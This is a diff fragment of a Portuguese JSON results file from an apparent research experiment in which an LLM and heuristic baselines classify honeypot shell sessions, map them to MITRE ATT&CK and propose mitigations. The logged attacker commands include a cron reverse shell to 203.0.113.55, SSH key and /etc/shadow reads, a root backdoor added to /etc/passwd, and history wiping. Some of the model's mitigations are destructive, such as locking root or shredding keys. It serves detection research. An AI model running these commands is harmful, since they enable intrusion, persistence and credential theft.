+        "whoami && hostname",
+        "ip a",
+        "netstat -tulpn",
+        "cat ~/.ssh/id_rsa",
+        "crontab -l",
+        "echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/203.0.113.55/4443 0>&1\"' >> /etc/crontab",
+        "unset HISTFILE && exit"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -1367,6 +2579,17 @@
     "ordem": 26,
     "session_id": "hum_06_b42c8190e103",
     "src_ip": "198.51.100.77",
+    "duracao_segundos": 65.0,
+    "pausas_segundos": [
+      5,
+      6,
+      8,
+      9,
+      8,
+      11,
+      9,
+      7
+    ],
     "comandos": [
       "whoami",
       "id",
@@ -1377,10 +2600,33 @@
       "cat ~/.ssh/id_rsa",
       "netstat -tulpn"
     ],
+    "comandos_com_tempo": [
+      "[1] whoami (+5s)",
+      "[2] id (+6s)",
+      "[3] ls -la /var/www/ (+8s)",
+      "[4] cd /var/www/html && ls -la (+9s)",
+      "[5] cat /etc/os-release (+8s)",
+      "[6] find / -perm -4000 2>/dev/null (+11s)",
+      "[7] cat ~/.ssh/id_rsa (+9s)",
+      "[8] netstat -tulpn (+7s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] whoami",
+      "[2] id",
+      "[3] ls -la /var/www/",
+      "[4] cd /var/www/html && ls -la",
+      "[5] cat /etc/os-release",
+      "[6] find / -perm -4000 2>/dev/null",
+      "[7] cat ~/.ssh/id_rsa",
+      "[8] netstat -tulpn"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "retido_no_filtro_l1": false,
     "classificacao_baseline_heuristico": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_llm_direto": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
     "tempo_segundos_api": 1.68,
     "resposta_crua_llm": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -1438,6 +2684,68 @@
         "netstat -tulpn"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor realizou reconhecimento interativo detalhado no sistema, incluindo identificação de privilégios, listagem de diretórios web, enumeração de arquivos SUID para escalação de privilégios, roubo de chave privada SSH e verificação de portas abertas.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "whoami, id"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1083",
+          "technique_name": "File and Directory Discovery",
+          "evidence": "ls -la /var/www/, cd /var/www/html && ls -la"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "cat /etc/os-release"
+        },
+        {
+          "tactic": "Privilege Escalation",
+          "technique_id": "T1611",
+          "technique_name": "Escape to Host",
+          "evidence": "find / -perm -4000 2>/dev/null"
+        },
+        {
+          "tactic": "Credential Access",
+          "technique_id": "T1552.004",
+          "technique_name": "Unsecured Credentials: Private Keys",
+          "evidence": "cat ~/.ssh/id_rsa"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1049",
+          "technique_name": "System Network Connections Discovery",
+          "evidence": "netstat -tulpn"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.77 -j DROP",
+        "passwd -l admin_ti",
+        "shred -u ~/.ssh/id_rsa"
+      ],
+      "session_id": "hum_06_b42c8190e103",
+      "src_ip": "198.51.100.77",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.72,
+      "comandos": [
+        "whoami",
+        "id",
+        "ls -la /var/www/",
+        "cd /var/www/html && ls -la",
+        "cat /etc/os-release",
+        "find / -perm -4000 2>/dev/null",
+        "cat ~/.ssh/id_rsa",
+        "netstat -tulpn"
+      ]
+    },
     "conferencia_mitre": {
       "status": "PARCIAL",
       "justificativa": "O modelo mapeou find / -perm -4000 diretamente para abuso de SUID (T1548.001) pela intencao final, mas a acao executada no log e descoberta de arquivos (T1083)."
@@ -1453,6 +2761,16 @@
     "ordem": 27,
     "session_id": "hum_07_c91e3048f216",
     "src_ip": "203.0.113.19",
+    "duracao_segundos": 47.0,
+    "pausas_segundos": [
+      4,
+      6,
+      6,
+      10,
+      6,
+      8,
+      5
+    ],
     "comandos": [
       "whoami",
       "sudo -l",
@@ -1462,10 +2780,31 @@
       "cat /var/log/auth.log | tail -n 20",
       "history -c && rm -f ~/.bash_history"
     ],
+    "comandos_com_tempo": [
+      "[1] whoami (+4s)",
+      "[2] sudo -l (+6s)",
+      "[3] cat /etc/passwd (+6s)",
+      "[4] echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd (+10s)",
+      "[5] crontab -l (+6s)",
+      "[6] cat /var/log/auth.log | tail -n 20 (+8s)",
+      "[7] history -c && rm -f ~/.bash_history (+5s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] whoami",
+      "[2] sudo -l",
+      "[3] cat /etc/passwd",
+      "[4] echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd",
+      "[5] crontab -l",
+      "[6] cat /var/log/auth.log | tail -n 20",
+      "[7] history -c && rm -f ~/.bash_history"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "retido_no_filtro_l1": false,
     "classificacao_baseline_heuristico": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_llm_direto": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
     "tempo_segundos_api": 1.5,
     "resposta_crua_llm": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -1511,6 +2850,49 @@
         "history -c && rm -f ~/.bash_history"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor realizou reconhecimento local (whoami, sudo -l, cat /etc/passwd), criou persistência adicionando um usuário com privilégios de root ao arquivo passwd, verificou tarefas agendadas e logs, e limpou o histórico do shell para ocultar rastros.",
+      "mitre_attack": [
+        {
+          "tactic": "Privilege Escalation",
+          "technique_id": "T1078",
+          "technique_name": "Valid Accounts",
+          "evidence": "echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
+          "evidence": "history -c && rm -f ~/.bash_history"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1083",
+          "technique_name": "File and Directory Discovery",
+          "evidence": "cat /etc/passwd"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 203.0.113.19 -j DROP",
+        "passwd -l sysadmin",
+        "sed -i '/backdoor/d' /etc/passwd"
+      ],
+      "session_id": "hum_07_c91e3048f216",
+      "src_ip": "203.0.113.19",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.52,
+      "comandos": [
+        "whoami",
+        "sudo -l",
+        "cat /etc/passwd",
+        "echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd",
+        "crontab -l",
+        "cat /var/log/auth.log | tail -n 20",
+        "history -c && rm -f ~/.bash_history"
+      ]
+    },
     "conferencia_mitre": {
       "status": "PARCIAL",
       "justificativa": "O modelo mapeou sudo -l diretamente para abuso de elevacao de privilegio (T1548), embora o comando apenas liste permissoes sudo disponiveis."
@@ -1526,6 +2908,15 @@
     "ordem": 28,
     "session_id": "hum_08_d73f5021a804",
     "src_ip": "198.51.100.81",
+    "duracao_segundos": 42.0,
+    "pausas_segundos": [
+      4,
+      6,
+      7,
+      8,
+      9,
+      6
+    ],
     "comandos": [
       "pwd",
       "ls -la /home",
@@ -1534,10 +2925,29 @@
       "find /etc -writable 2>/dev/null",
       "history -c"
     ],
+    "comandos_com_tempo": [
+      "[1] pwd (+4s)",
+      "[2] ls -la /home (+6s)",
+      "[3] cat /etc/group (+7s)",
+      "[4] ss -tulnp (+8s)",
+      "[5] find /etc -writable 2>/dev/null (+9s)",
+      "[6] history -c (+6s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] pwd",
+      "[2] ls -la /home",
+      "[3] cat /etc/group",
+      "[4] ss -tulnp",
+      "[5] find /etc -writable 2>/dev/null",
+      "[6] history -c"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "retido_no_filtro_l1": false,
     "classificacao_baseline_heuristico": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_llm_direto": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
     "tempo_segundos_api": 1.48,
     "resposta_crua_llm": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -1587,6 +2997,54 @@
         "history -c"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "MÉDIO",
+      "summary": "O invasor realizou reconhecimento manual do sistema, listando diretórios de usuários, verificando grupos do sistema, conexões de rede ativas, buscando arquivos graváveis e limpando o histórico de comandos para ocultar rastros.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1083",
+          "technique_name": "File and Directory Discovery",
+          "evidence": "ls -la /home e find /etc -writable 2>/dev/null"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1069",
+          "technique_name": "Permission Groups Discovery",
+          "evidence": "cat /etc/group"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1049",
+          "technique_name": "System Network Connections Discovery",
+          "evidence": "ss -tulnp"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
+          "evidence": "history -c"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.81 -j DROP",
+        "passwd -l root",
+        "auditctl -w /etc/group -p wa -k group_mod"
+      ],
+      "session_id": "hum_08_d73f5021a804",
+      "src_ip": "198.51.100.81",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.65,
+      "comandos": [
+        "pwd",
+        "ls -la /home",
+        "cat /etc/group",
+        "ss -tulnp",
+        "find /etc -writable 2>/dev/null",
+        "history -c"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -1602,14 +3060,30 @@
     "ordem": 29,
     "session_id": "hum_09_e54a9017b329",
     "src_ip": "198.51.100.82",
+    "duracao_segundos": 54.0,
+    "pausas_segundos": [
+      14,
+      38
+    ],
     "comandos": [
       "cat /etc/shadow",
       "history -c"
     ],
+    "comandos_com_tempo": [
+      "[1] cat /etc/shadow (+14s)",
+      "[2] history -c (+38s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] cat /etc/shadow",
+      "[2] history -c"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "retido_no_filtro_l1": false,
     "classificacao_baseline_heuristico": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_llm_direto": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
     "tempo_segundos_api": 1.28,
     "resposta_crua_llm": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -1643,6 +3117,38 @@
         "history -c"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor realizou a leitura de hashes de senha (/etc/shadow) e limpou o histórico do shell (history -c), indicando comportamento manual com intenção de ocultar rastros.",
+      "mitre_attack": [
+        {
+          "tactic": "Credential Access",
+          "technique_id": "T1003.008",
+          "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
+          "evidence": "cat /etc/shadow"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal: Clear Command History",
+          "evidence": "history -c"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.82 -j DROP",
+        "passwd -e root",
+        "history -c && history -w"
+      ],
+      "session_id": "hum_09_e54a9017b329",
+      "src_ip": "198.51.100.82",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.27,
+      "comandos": [
+        "cat /etc/shadow",
+        "history -c"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -1658,6 +3164,15 @@
     "ordem": 30,
     "session_id": "hum_10_f18b6093c410",
     "src_ip": "198.51.100.83",
+    "duracao_segundos": 39.0,
+    "pausas_segundos": [
+      4,
+      5,
+      6,
+      7,
+      10,
+      5
+    ],
     "comandos": [
       "id",
       "uname -r",
@@ -1666,10 +3181,29 @@
       "useradd -m -s /bin/bash suporte",
       "history -c && exit"
     ],
+    "comandos_com_tempo": [
+      "[1] id (+4s)",
+      "[2] uname -r (+5s)",
+      "[3] ls -la /root (+6s)",
+      "[4] cat /etc/sudoers (+7s)",
+      "[5] useradd -m -s /bin/bash suporte (+10s)",
+      "[6] history -c && exit (+5s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] id",
+      "[2] uname -r",
+      "[3] ls -la /root",
+      "[4] cat /etc/sudoers",
+      "[5] useradd -m -s /bin/bash suporte",
+      "[6] history -c && exit"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "retido_no_filtro_l1": false,
     "classificacao_baseline_heuristico": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_llm_direto": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
     "tempo_segundos_api": 1.45,
     "resposta_crua_llm": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -1710,6 +3244,54 @@
       "src_ip": "198.51.100.83",
       "etapa": "API_gemini-3.5-flash-lite",
       "tempo_segundos": 1.45,
+      "comandos": [
+        "id",
+        "uname -r",
+        "ls -la /root",
+        "cat /etc/sudoers",
+        "useradd -m -s /bin/bash suporte",
+        "history -c && exit"
+      ]
+    },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor realizou reconhecimento do sistema (id, uname, ls), investigou privilégios (cat /etc/sudoers), criou uma nova conta de usuário para persistência e limpou o histórico antes de sair.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "id"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -r"
+        },
+        {
+          "tactic": "Persistence",
+          "technique_id": "T1136.001",
+          "technique_name": "Create Account: Local Account",
+          "evidence": "useradd -m -s /bin/bash suporte"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
+          "evidence": "history -c"
+        }
+      ],
+      "mitigation_commands": [
+        "userdel -r suporte",
+        "passwd -l root",
+        "iptables -A INPUT -s 198.51.100.83 -j DROP"
+      ],
+      "session_id": "hum_10_f18b6093c410",
+      "src_ip": "198.51.100.83",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.53,
       "comandos": [
         "id",
         "uname -r",
